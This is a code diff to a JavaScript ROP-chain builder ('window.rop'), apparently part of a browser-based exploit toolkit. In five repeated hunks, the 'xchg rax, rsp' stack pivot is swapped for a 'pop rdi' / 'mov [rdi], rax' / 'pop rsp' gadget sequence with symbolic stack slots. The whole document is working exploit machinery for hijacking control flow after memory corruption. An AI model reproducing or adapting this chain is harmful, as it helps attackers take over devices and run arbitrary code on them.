@@ -157,7 +157,14 @@ window.rop = function () {
     this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["xchg rax, rsp"]);
+    this.push(window.gadgets["pop rdi"]);
+    var a  = this.pushSymbolic();
+    this.push(window.gadgets["mov [rdi], rax"]);
+    this.push(window.gadgets["pop rsp"]);
+    var b = this.get_rsp();
+    this.push(0x41414141);
+
+    this.finalizeSymbolic(a, b);
 
     return branch_addr_spc;
 
@@ -179,7 +186,14 @@ window.rop = function () {
     this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["xchg rax, rsp"]);
+    this.push(window.gadgets["pop rdi"]);
+    var a  = this.pushSymbolic();
+    this.push(window.gadgets["mov [rdi], rax"]);
+    this.push(window.gadgets["pop rsp"]);
+    var b = this.get_rsp();
+    this.push(0x41414141);
+
+    this.finalizeSymbolic(a, b);
 
     return branch_addr_spc;
   }
@@ -200,7 +214,14 @@ window.rop = function () {
     this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["xchg rax, rsp"]);
+    this.push(window.gadgets["pop rdi"]);
+    var a  = this.pushSymbolic();
+    this.push(window.gadgets["mov [rdi], rax"]);
+    this.push(window.gadgets["pop rsp"]);
+    var b = this.get_rsp();
+    this.push(0x41414141);
+
+    this.finalizeSymbolic(a, b);
 
     return branch_addr_spc;
   }
@@ -221,7 +242,14 @@ window.rop = function () {
     this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["xchg rax, rsp"]);
+    this.push(window.gadgets["pop rdi"]);
+    var a  = this.pushSymbolic();
+    this.push(window.gadgets["mov [rdi], rax"]);
+    this.push(window.gadgets["pop rsp"]);
+    var b = this.get_rsp();
+    this.push(0x41414141);
+
+    this.finalizeSymbolic(a, b);
 
     return branch_addr_spc;
   }
@@ -242,7 +270,14 @@ window.rop = function () {
     this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["xchg rax, rsp"]);
+    this.push(window.gadgets["pop rdi"]);
+    var a  = this.pushSymbolic();
+    this.push(window.gadgets["mov [rdi], rax"]);
+    this.push(window.gadgets["pop rsp"]);
+    var b = this.get_rsp();
+    this.push(0x41414141);
+
+    this.finalizeSymbolic(a, b);
 
     return branch_addr_spc;
   }
